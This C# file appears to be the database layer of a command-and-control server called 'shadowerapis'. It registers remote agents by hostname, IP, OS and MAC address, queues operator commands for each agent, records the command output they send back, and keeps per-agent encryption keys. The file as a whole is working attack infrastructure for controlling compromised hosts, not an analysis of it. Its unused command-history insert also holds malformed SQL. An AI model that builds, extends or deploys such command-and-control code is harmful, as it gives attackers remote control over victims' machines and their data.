using Npgsql;
using shadowerapis.Helper;
using shadowerapis.Models;

namespace shadowerapis.dbops
{
    public static class dbophelper
    {
        //tested
        public static string RegisterAgent(string strConn, shadoweragent oshadoweragent)
        {
            string strAgentUniqId = string.Empty;
            try
            {
                strAgentUniqId = AgentRegisterDBOps(strConn, oshadoweragent);
            }
            catch (Exception ex)
            {

                return "Agent registration failed : " + ex.Message;
            }

            return strAgentUniqId;

        }
        public static string SendResultToC2(string strConn, commandresult osendcommandres)
        {
            string strAgentUniqId = string.Empty;
            try
            {

                strAgentUniqId = UpdateWithCommandResultDBOps(strConn, osendcommandres);
                //UpdateCommandHistoryDBOps(strConn, osendcommandres);


            }
            catch (Exception ex)
            {

                return "Send command result to c2 failed : " + ex.Message;
            }

            return strAgentUniqId;

        }

        //tested
        public static string SendCommandToAgent(string strConn, command osendcommand)
        {
            string strAgentUniqId = string.Empty;
            try
            {
                strAgentUniqId = CommandToAgentDBOps(strConn, osendcommand);
            }
            catch (Exception ex)
            {

                return "Send command to agent failed : " + ex.Message;
            }

            return strAgentUniqId;

        }

        //tested
        public static string? GetCommandFromC2(string strConn, command ogetcommand)
        {
            string? strCommandFromC2 = string.Empty;
            try
            {
                strCommandFromC2 = GetCommandDBOps(strConn, ogetcommand);


            }
            catch (Exception ex)
            {

                return "Get command from C2 failed : " + ex.Message;
            }

            return strCommandFromC2;

        }
        public static Dictionary<string, string> GetCommandAndKeyDBOps(string strConn, command ogetcommand)
        {
            Dictionary<string, string> dictCommandAndKey = new Dictionary<string, string>();
            List<string> lstkeyandcommand = new List<string>();
            try
            {
                lstkeyandcommand = GetPubKeyAndCommandDBOps(strConn, ogetcommand);
                if (lstkeyandcommand.Count > 0)
                {
                    dictCommandAndKey["command"] = lstkeyandcommand[0];
                    dictCommandAndKey["key"] = lstkeyandcommand[1];
                }


            }
            catch (Exception ex)
            {
                dictCommandAndKey["error"] = "Get command from C2 failed : " + ex.Message;
                return dictCommandAndKey;
            }

            return dictCommandAndKey;

        }

        public static string ClearLastCommandDBOps(string strConn, command osendcommand)
        {
            string strAgentUniqId = string.Empty;
            try
            {
                strAgentUniqId = ClearLastCmdForAgent(strConn, osendcommand);
            }
            catch (Exception ex)
            {

                return "Send command to agent failed : " + ex.Message;
            }

            return strAgentUniqId;

        }

        public static List<shadoweragent> ListAllAgents(string strConn)
        {
            List<shadoweragent> lstAllAgents = new List<shadoweragent>();
            try
            {
                lstAllAgents = GetAllAgentsDBOps(strConn);

            }
            catch (Exception)
            {

                return lstAllAgents;
            }

            return lstAllAgents;

        }

        public static commandresult GetCommandResult(string strConn, string strAgentID)
        {
            commandresult ocommandresult = new commandresult();
            try
            {
                ocommandresult = GetAgentDetailsWithCommandResultDBOps(strConn, strAgentID);

            }
            catch (Exception)
            {

                return ocommandresult;
            }

            return ocommandresult;

        }

        private static string GetUniqID()
        {
            string strGuid = Guid.NewGuid().ToString() + DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss");
            strGuid = strGuid.Replace(" ", "");
            return strGuid;
        }


        private static commandresult GetAgentDetailsWithCommandResultDBOps(string strConn, string strAgentUniqID)
        {
            commandresult ocommandresult = new commandresult();

            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //Get the command from C2

                string query = "SELECT commandtxtres,command, agentuniqid FROM shadoweragent WHERE agentuniqID=@agentuniqID";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    psgsqlConn.Open();
                    cmd.Parameters.AddWithValue("@agentuniqid", strAgentUniqID);

                    using (NpgsqlDataReader sdrAgents = cmd.ExecuteReader())
                    {
                        while (sdrAgents.Read())
                        {

                            ocommandresult.commandfromc2 = Convert.ToString(sdrAgents["command"]); 
                            ocommandresult.cmdtxtresult = Convert.ToString(sdrAgents["commandtxtres"]);
                            ocommandresult.agentuniqid = Convert.ToString(sdrAgents["agentuniqid"]);                           
                        }
                    }
                    psgsqlConn.Close();
                }
            }
            return ocommandresult;

        }

        private static List<shadoweragent> GetAllAgentsDBOps(string strConn)
        {
            List<shadoweragent> lstAllAgents = new List<shadoweragent>();

            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //Get the command from C2

                string query = "SELECT agenthostname,agentIP,agentOS,agentmacid,agentuniqid,command, commandtxtres,pub_key, pvt_key, aes_key, aes_iv,createdat FROM shadoweragent";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    psgsqlConn.Open();
                    using (NpgsqlDataReader sdrAgents = cmd.ExecuteReader())
                    {
                        while (sdrAgents.Read())
                        {
                            shadoweragent oshadoweragent = new shadoweragent();
                            oshadoweragent.agentHostName = Convert.ToString(sdrAgents["agenthostname"]);
                            oshadoweragent.agentOS = Convert.ToString(sdrAgents["agentOS"]);
                            oshadoweragent.agentIP = Convert.ToString(sdrAgents["agentIP"]);
                            oshadoweragent.agentMacID = Convert.ToString(sdrAgents["agentmacid"]);
                            oshadoweragent.agentUniquID = Convert.ToString(sdrAgents["agentuniqid"]);
                            oshadoweragent.createdat = Convert.ToString(sdrAgents["createdat"]);
                            oshadoweragent.command = Convert.ToString(sdrAgents["command"]);
                            oshadoweragent.commandtxtres = Convert.ToString(sdrAgents["commandtxtres"]);
                            oshadoweragent.pub_key = Convert.ToString(sdrAgents["pub_key"]);
                            oshadoweragent.pvt_key = Convert.ToString(sdrAgents["pvt_key"]);
                            oshadoweragent.aes_key = Convert.ToString(sdrAgents["aes_key"]);
                            oshadoweragent.aes_iv = Convert.ToString(sdrAgents["aes_iv"]);

                            lstAllAgents.Add(oshadoweragent);
                        }
                    }
                    psgsqlConn.Close();
                }
            }
            return lstAllAgents;

        }
        private static string? GetCommandDBOps(string strConn, command ogetcommand)
        {
            string? strCommandFromC2 = null;
            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //Get the command from C2

                string query = "SELECT command FROM shadoweragent WHERE agentuniqid = @agentuniqid";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    cmd.Parameters.AddWithValue("@agentuniqid", ogetcommand.agentuniqid);
                    psgsqlConn.Open();
                    using (NpgsqlDataReader sdrAgentCommand = cmd.ExecuteReader())
                    {
                        while (sdrAgentCommand.Read())
                        {

                            strCommandFromC2 = Convert.ToString(sdrAgentCommand["command"]);

                        }
                    }
                    psgsqlConn.Close();
                }
            }
            return strCommandFromC2;
        }

        private static List<string> GetPubKeyAndCommandDBOps(string strConn, command ogetcommand)
        {
            List<string> lstCommandAndKey = new List<string>();
            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //Get the command from C2 this c2 works only in http it starts in http and then transfers into https

                string query = "SELECT command,pub_key FROM shadoweragent WHERE agentuniqid = @agentuniqid";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    cmd.Parameters.AddWithValue("@agentuniqid", ogetcommand.agentuniqid);
                    psgsqlConn.Open();
                    using (NpgsqlDataReader sdrAgentCommand = cmd.ExecuteReader())
                    {
                        while (sdrAgentCommand.Read())
                        {

                            lstCommandAndKey.Add(Convert.ToString(sdrAgentCommand["command"]));
                            lstCommandAndKey.Add(Convert.ToString(sdrAgentCommand["pub_key"]));

                        }
                    }
                    psgsqlConn.Close();
                }
            }
            return lstCommandAndKey;
        }
        private static string AgentRegisterDBOps(string strConn, shadoweragent oshadoweragent)
        {
            string strAgentUniqId = string.Empty;
            Dictionary<string, string> keypair = HelperFunctions.CreateServerKeyPair();


            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //inserting Patient data into database
                oshadoweragent.agentUniquID = GetUniqID();
                string query = "INSERT INTO shadoweragent (agenthostname,agentIP,agentOS,agentmacid,agentuniqid,command,pub_key,pvt_key, createdat) VALUES (@agenthostname,@agentIP,@agentOS,@agentmacid, @agentuniqid,@command,@pub_key,@pvt_key,@createdat)";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    cmd.Parameters.AddWithValue("@agenthostname", oshadoweragent.agentHostName);
                    cmd.Parameters.AddWithValue("@agentIP", oshadoweragent.agentIP);
                    cmd.Parameters.AddWithValue("@agentOS", oshadoweragent.agentOS);
                    cmd.Parameters.AddWithValue("@agentmacid", oshadoweragent.agentMacID);
                    cmd.Parameters.AddWithValue("@agentuniqid", oshadoweragent.agentUniquID);
                    cmd.Parameters.AddWithValue("@command", oshadoweragent.command);
                    cmd.Parameters.AddWithValue("@pub_key", keypair["PUBKEY"]);
                    cmd.Parameters.AddWithValue("@pvt_key", keypair["PVTKEY"]);
                    cmd.Parameters.AddWithValue("@createdat", DateTime.Now);

                    psgsqlConn.Open();
                    int i = cmd.ExecuteNonQuery();
                    if (i > 0)
                    {
                        psgsqlConn.Close();
                        strAgentUniqId = oshadoweragent.agentUniquID;

                    }
                }
            }
            return strAgentUniqId;
        }

        private static string UpdateWithCommandResultDBOps(string strConn, commandresult osendcommandres)
        {
            string strAgentUniqId = string.Empty;
            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //Update command for the agent
                string query = "UPDATE shadoweragent SET commandtxtres=@commandtxtres,aes_iv=@aes_iv,aes_key=@aes_key where agentuniqid=@agentuniqid";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    cmd.Parameters.AddWithValue("@commandtxtres", osendcommandres.cmdtxtresult);
                    cmd.Parameters.AddWithValue("@agentuniqid", osendcommandres.agentuniqid);
                    cmd.Parameters.AddWithValue("@aes_iv", osendcommandres.aes_iv);
                    cmd.Parameters.AddWithValue("@aes_key", osendcommandres.aes_key);
                    psgsqlConn.Open();
                    int i = cmd.ExecuteNonQuery();
                    if (i > 0)
                    {
                        psgsqlConn.Close();
                        strAgentUniqId = osendcommandres.agentuniqid;
                    }
                }
            }
            return strAgentUniqId;
        }
        private static string ClearLastCmdForAgent(string strConn, command osendcommand)
        {
            string strAgentUniqId = string.Empty;
            osendcommand.commandfromc2 = string.Empty;
            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //Update command for the agent
                string query = "UPDATE shadoweragent SET  command=@command where agentuniqid=@agentuniqid";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    cmd.Parameters.AddWithValue("@command", osendcommand.commandfromc2);
                    cmd.Parameters.AddWithValue("@agentuniqid", osendcommand.agentuniqid);
                    psgsqlConn.Open();
                    int i = cmd.ExecuteNonQuery();
                    if (i > 0)
                    {
                        psgsqlConn.Close();
                        strAgentUniqId = osendcommand.agentuniqid;
                    }
                }
            }
            return strAgentUniqId;
        }
        private static string CommandToAgentDBOps(string strConn, command osendcommand)
        {
            string strAgentUniqId = string.Empty;
            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                //Update command for the agent
                string query = "UPDATE shadoweragent SET  command=@command where agentuniqid=@agentuniqid";
                using (NpgsqlCommand cmd = new NpgsqlCommand(query, psgsqlConn))
                {
                    cmd.Parameters.AddWithValue("@command", osendcommand.commandfromc2);
                    cmd.Parameters.AddWithValue("@agentuniqid", osendcommand.agentuniqid);
                    psgsqlConn.Open();
                    int i = cmd.ExecuteNonQuery();
                    if (i > 0)
                    {
                        psgsqlConn.Close();
                        strAgentUniqId = osendcommand.agentuniqid;
                    }
                }
            }
            return strAgentUniqId;
        }
        private static void UpdateCommandHistoryDBOps(string strConn, commandresult osendcommandres)
        {
            using (NpgsqlConnection psgsqlConn = new NpgsqlConnection(strConn))
            {
                string insquery = "INSERT INTO commandhistory (agentidentifier,command,commandtxtres) VALUES (agentidentifier=@agentidentifier,command=@command,commandtxtres=@commandtxtres)";
                using (NpgsqlCommand cmd = new NpgsqlCommand(insquery, psgsqlConn))
                {
                    cmd.Parameters.AddWithValue("@agentidentifier", osendcommandres.agentuniqid);
                    cmd.Parameters.AddWithValue("@command", osendcommandres.commandfromc2);
                    cmd.Parameters.AddWithValue("@commandtxtres", osendcommandres.cmdtxtresult);
                    psgsqlConn.Open();
                    int i = cmd.ExecuteNonQuery();
                    if (i > 0)
                    {
                        psgsqlConn.Close();
                    }

                }
            }
        }
    }
}
